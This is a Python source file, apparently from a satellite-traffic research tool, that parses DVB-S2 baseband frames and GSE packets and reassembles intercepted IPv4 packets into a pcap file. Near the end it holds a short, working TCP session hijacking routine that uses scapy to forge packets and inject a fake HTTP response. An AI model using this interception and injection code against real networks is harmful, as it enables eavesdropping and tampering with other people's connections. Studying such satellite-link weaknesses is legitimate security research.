from .parsers.pure_bb import PureBb
from .parsers.pure_gse import PureGse
from .parsers.ipv4_packet import Ipv4Packet
from kaitaistruct import KaitaiStream, BytesIO
from .pcaplib import Writer
from datetime import datetime
from scapy.layers.all import IP, TCP, Ether, ICMP
from scapy.all import send, sendp, sendpfast
import time
import socket
defrag_dict = {}

counters = {
    'gse_start_packets': 0,
    'gse_end_packets': 0,
    'gse_mid_packets': 0,
    'gse_full_packets': 0,
    'gse_padding_packets': 0,
    'defragmented_gse_packets': 0,
    'salvage_gse_packets': 0,
    'truncated_gse_packets': 0,
    'broken_bbframes': 0,
    'ip_recovered': 0,
    'non_ip_or_corrupt_gse': 0,
}

sync_dict = {}

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

def gse_parse(file, outfile, matype_crib=int(0x4200), stream=False, tcp_hijack=False, tcp_hijack_ips=None):
    with open(outfile, 'wb') as pcap_file:
        io = KaitaiStream(open(file, 'rb'))
        pcap_writer = Writer()
        pcap_writer.create_header(pcap_file)
        bbframe_count = 1
        pkt_count = 0
        eof_count = 0
        while True:
            try:
                last_pos = io.pos()
                current_bbframe = PureBb(io, matype_crib=matype_crib).bbframe
                if eof_count >0:
                    print("new frames found, continuing...")
                    eof_count = 0
            except EOFError:
                if not stream:
                    break
                elif eof_count == 0:
                    pass
                elif eof_count % 10000 == 0:
                    time.sleep(1)
                elif eof_count > 1000000:
                    time.sleep(10)
                elif eof_count > 1000600:
                    print("No new data received for at least 1 hour. Exiting gsextract.")
                eof_count += 1
                io.seek(last_pos)
                continue
            except:
                continue

            bbframe_count += 1
            if hasattr(current_bbframe, 'corrupt_data'):
                counters['broken_bbframes'] += 1
                print("BBFrame", bbframe_count, " contains corrupt data, (MA2:", current_bbframe.bbheader.matype_2, ") attempting to recover")
            else:
                gse_packets = get_gse_from_bbdata(current_bbframe.data_field)
                raw_packets = parse_gse_packet_array(gse_packets, bbframe_count)
                if len(raw_packets) > 0:
                    pcap_writer.write(raw_packets, pcap_file)
                    pkt_count += len(raw_packets)
                    if pkt_count % 10000 == 0:
                        print(pkt_count, "packets parsed")
                        print(counters)
        print(counters)

def get_gse_from_bbdata(bbdata):
    io = KaitaiStream(BytesIO(bbdata))
    gse_packets = []
    while not io.is_eof():
        try:
            current_gse = PureGse(io).gse_packet
            gse_packets.append(current_gse)
        except EOFError:
            counters['truncated_gse_packets'] += 1
        except ValueError:
            counters['truncated_gse_packets'] += 1
    return gse_packets

def parse_gse_packet_array(gse_packets, frame_number):
    scapy_packets = []
    for gse in gse_packets:
        s_packets = None
        if gse.gse_header.end_indicator and not gse.gse_header.start_indicator:
            counters['gse_end_packets'] += 1
        elif not gse.gse_header.end_indicator and not gse.gse_header.start_indicator:
            counters['gse_mid_packets'] += 1
        if gse.gse_header.is_padding_packet:
            counters['gse_padding_packets'] += 1
            pass
        elif gse.gse_header.start_indicator and gse.gse_header.end_indicator:
            # complete gse packet
            counters['gse_full_packets'] += 1
            s_packets = extract_ip_from_gse_data(gse.gse_payload.data)
        else:
            frag_id = str(gse.gse_header.frag_id)
            if gse.gse_header.start_indicator and not gse.gse_header.end_indicator:
                counters['gse_start_packets'] += 1
                # start of gse fragment
                if frag_id in defrag_dict:
                    # if this interrupts an already started fragment
                    # parse the existing (partial) fragment to the best of our ability before overwriting
                    s_packets = extract_ip_from_gse_data(defrag_dict[frag_id][1])
                    counters['salvage_gse_packets'] += 1

                # we add a tuple with the index of the new fragment to the defragment dictionary
                defrag_dict[frag_id] = (frame_number, gse.gse_payload.data)

            elif frag_id in defrag_dict:
                # if it's a middle or end packet and we've seen the start packet, lets try to add it to the existing data
                if frame_number - defrag_dict[frag_id][0] > 256:
                    # if the frame number where we caught this is more than 256 frames from the start packet it cannot be a valid fragment
                    # we'll make a best effort to recover the existing partial fragment with dummy data
                    s_packets = extract_ip_from_gse_data(defrag_dict[frag_id][1])
                    counters['salvage_gse_packets'] += 1

                    # then we'll delete the expired data from the fragment dictionary
                    defrag_dict.pop(frag_id, None)
                else:
                    # we can append the current chunk of the frame to our already recorded data
                    defrag_dict[frag_id] = (defrag_dict[frag_id][0], defrag_dict[frag_id][1] + gse.gse_payload.data)

                    # if this is the end of a fragment, we can go ahead and attempt to parse out packets and then clear the dictionary
                    if gse.gse_header.end_indicator:
                        extracted_ip_packets = extract_ip_from_gse_data(defrag_dict[frag_id][1])
                        if extracted_ip_packets is not None:
                            scapy_packets.append(extract_ip_from_gse_data(defrag_dict[frag_id][1]))
                        counters['defragmented_gse_packets'] += 1
                        defrag_dict.pop(frag_id, None)
        if s_packets is not None:
            scapy_packets.append(s_packets)
    return scapy_packets

def extract_ip_from_gse_data(raw_data, high_reliability=False, tcp_hijack=False, tcp_hijack_ips=[None, None]):
    ip_packet = None
    simple_packet = None
    try:
        ip_packet = Ipv4Packet.from_bytes(raw_data)
    except EOFError:
        # if there's just not enough bytes, we can try adding a small number of padding bytes to see if it makes for a mostly recovered packet
        # we'll try to recover up to 3x the length of the original packet
        try:
            raw_data = raw_data + (3*len(raw_data))*b"\x00"
            ip_packet = Ipv4Packet.from_bytes(raw_data)
        except:
            counters['non_ip_or_corrupt_gse'] += 1
    except ValueError:
        counters['non_ip_or_corrupt_gse'] += 1
    except:
        pass
    if ip_packet is not None:
        seconds_time = time.time()
        dt = datetime.now()
        simple_packet = (int(seconds_time), dt.microsecond, len(raw_data), len(raw_data), raw_data)

        # This is a very simple example of TCP hijacking
        # You would need to pass both a target and destination IP address through to the parent function
        # This is not implemented in the command-line tool but the modifications should be straightforward
        if tcp_hijack and (ip_packet.src_ip_addr == tcp_hijack_ips[0] or ip_packet.dst_ip_addr == tcp_hijack_ips[0]) and (ip_packet.src_ip_addr == tcp_hijack_ips[1] or ip_packet.dst_ip_addr == tcp_hijack_ips[1]):
            html = "<b>Hijacked TCP Session</b>"
            p = IP(raw_data)
            if "TCP" in p:
                 F = p[TCP].flags
                 forgery_ip = IP(src=p[IP].dst, dst=p[IP].src)
                 response = "HTTP/1.1 200 OK\n"
                 response += "Server: MyServer\n"
                 response += "Content-Type: text/html\n"
                 response += "Content-Length: " + str(len(html)) + "\n"
                 response += "Connection: close"
                 response += "\n\n"
                 response += html
                 if F & SYN and not F & ACK:
                     forgery_tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=123, ack=p[TCP].seq + 1,
                                       flags="AS")
                     forgery = Ether()/forgery_ip/forgery_tcp/response
                     sendp(forgery)
                 elif F & ACK and F & PSH:
                     forgery_tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack+1, ack=p[TCP].seq,
                                       flags="PA", options=p[TCP].options)
                     forgery = Ether()/forgery_ip/forgery_tcp/response
                     sendp(forgery)
                     forgery.show()
        counters['ip_recovered'] += 1
    return simple_packet